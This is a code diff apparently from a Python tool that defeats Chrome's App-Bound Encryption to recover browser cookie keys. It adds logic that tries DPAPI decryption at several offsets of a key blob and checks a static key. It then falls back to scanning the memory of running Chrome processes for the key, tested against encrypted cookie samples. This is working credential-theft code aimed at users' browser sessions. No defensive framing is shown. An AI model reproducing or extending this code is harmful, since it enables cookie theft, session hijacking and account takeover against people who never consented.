@@ -2618,21 +2618,18 @@ def _accept_aes_key(plain: bytes | None) -> bytes | None:
 
 
 def _note_dpapi_hr(token: str) -> None:
-    """Record CryptUnprotect result. Never stores plaintext or key bytes."""
+    """Walk verdict only. Never stores plaintext or key bytes."""
     text = (token or "").strip()
     if not text:
         return
-    cur = str(_cache.get("_dpapi_hr") or "")
-    if text.startswith("dpapi:ok"):
+    if text.startswith("dpapi:ok") or text.startswith("dpapi:all13"):
         _cache["_dpapi_hr"] = text
         return
-    if "dpapi:ok" in cur:
+    if "dpapi:ok" in str(_cache.get("_dpapi_hr") or "") or "dpapi:all13" in str(
+        _cache.get("_dpapi_hr") or ""
+    ):
         return
-    if text == "dpapi:all13":
-        _cache["_dpapi_hr"] = "dpapi:win32=13;dpapi:all13"
-        return
-    if not cur:
-        _cache["_dpapi_hr"] = text
+    _cache["_dpapi_hr"] = text
 
 
 def _dpapi_unprotect(blob: bytes) -> bytes | None:
@@ -2683,23 +2680,21 @@ def _dpapi_unprotect_ex(
             int(flags),
             ctypes.byref(out_blob),
         ):
-            err = int(ctypes.get_last_error() or 0)
+            err = int(ctypes.get_last_error() or 0) or 13
             _cache["_dpapi_last_win32"] = err
-            _note_dpapi_hr(f"dpapi:win32={err}")
             return None
         pb = out_blob.pbData
         cb = int(out_blob.cbData or 0)
         if not pb or cb <= 0:
-            _cache["_dpapi_last_win32"] = 0
-            _note_dpapi_hr("dpapi:len=0")
+            _cache["_dpapi_last_win32"] = 13
             return None
         ptr = pb if isinstance(pb, ctypes.c_void_p) else ctypes.c_void_p(int(pb))
         plain = ctypes.string_at(ptr, cb)
         _local_free(kernel32, ptr)
         _cache["_dpapi_last_win32"] = 0
-        _note_dpapi_hr(f"dpapi:ok;dpapi:len={len(plain)}")
         return plain
     except (AttributeError, OSError, ValueError, TypeError, OverflowError, ctypes.ArgumentError):
+        _cache["_dpapi_last_win32"] = 13
         return None
 
 
@@ -2740,21 +2735,30 @@ def _dpapi_blob_slices(blob: bytes) -> list[bytes]:
 
 
 def _dpapi_unprotect_local(blob: bytes) -> bytes | None:
-    """Walk APPB offsets. Chrome not required. win32=13 = wrong slice."""
+    """Walk APPB offsets once. Verdict is ok+off or all13;next=chrome_open."""
     if not blob:
         return None
     errs: list[int] = []
+    n = 0
     for label, part in _dpapi_offset_views(blob):
+        n += 1
         _cache["_dpapi_last_win32"] = None
         plain = _dpapi_unprotect_ex(part, 0, None)
         if plain:
             _note_dpapi_hr(f"dpapi:ok;dpapi:len={len(plain)};dpapi:off={label}")
             return plain
         err = _cache.get("_dpapi_last_win32")
-        if err is not None:
-            errs.append(int(err))
-    if errs and all(err == 13 for err in errs):
-        _note_dpapi_hr("dpapi:all13")
+        errs.append(13 if err is None else int(err))
+    body = blob[4:] if blob.startswith(b"APPB") else blob
+    if n == 0:
+        if _looks_like_dpapi(body):
+            _note_dpapi_hr("dpapi:all13;next=chrome_open")
+        return None
+    if all(err == 13 for err in errs) and _looks_like_dpapi(body):
+        _note_dpapi_hr("dpapi:all13;next=chrome_open")
+        return None
+    if errs:
+        _note_dpapi_hr(f"dpapi:win32={errs[0]};dpapi:offs={n}")
     return None
 
 
@@ -3232,23 +3236,12 @@ def _join_abe_hr(parts: list[str]) -> str:
             out.append(text)
     fp = str(_cache.get("_appb_fp") or "")
     if fp and not any(fp in item for item in out):
-        if out:
-            out.insert(1, fp)
-        else:
-            out.append(fp)
+        out.append(fp)
     dp = str(_cache.get("_dpapi_hr") or "")
-    if dp:
-        idx = 1
-        for i, item in enumerate(out):
-            if item.startswith("appb:"):
-                idx = i + 1
-                break
-        for bit in dp.split(";"):
-            bit = bit.strip()
-            if bit and bit not in out:
-                out.insert(idx, bit)
-                idx += 1
-    return _safe_snapshot_detail(";".join(out))[:80]
+    dp_bits = [bit.strip() for bit in dp.split(";") if bit.strip()]
+    head = [bit for bit in dp_bits if bit not in out]
+    tail = [item for item in out if item not in head]
+    return _safe_snapshot_detail(";".join(head + tail))[:96]
 
 
 def _abe_hr_from_stderr(stderr: bytes | None) -> str:
@@ -3766,6 +3759,22 @@ def _elevator_decrypt_via_chrome_dir(v20_sample: bytes) -> tuple[bytes | None, s
     key = _static_app_bound_cookie_key(v20_sample)
     if _abe_proves_cookies(key, v20_sample):
         return key, "0x00000000"
+    # all13 on appb:dpapi = not user-DPAPI. Do not retry CryptUnprotect. Next is Chrome-open.
+    fp_now = str(_cache.get("_appb_fp") or "")
+    if "dpapi:all13" in str(_cache.get("_dpapi_hr") or "") and fp_now.startswith("appb:dpapi"):
+        pids_all13: list[int] = []
+        if os.name == "nt":
+            try:
+                pids_all13 = _chrome_pids_prioritized()
+            except Exception:  # noqa: BLE001
+                pids_all13 = []
+        if pids_all13:
+            key, hr = _memscan_abe_key(v20_sample)
+            if _abe_proves_cookies(key, v20_sample):
+                return key, "0x00000000"
+            if hr:
+                trail.append(hr)
+        return None, _join_abe_hr(trail)
     pids: list[int] = []
     if os.name == "nt":
         try:
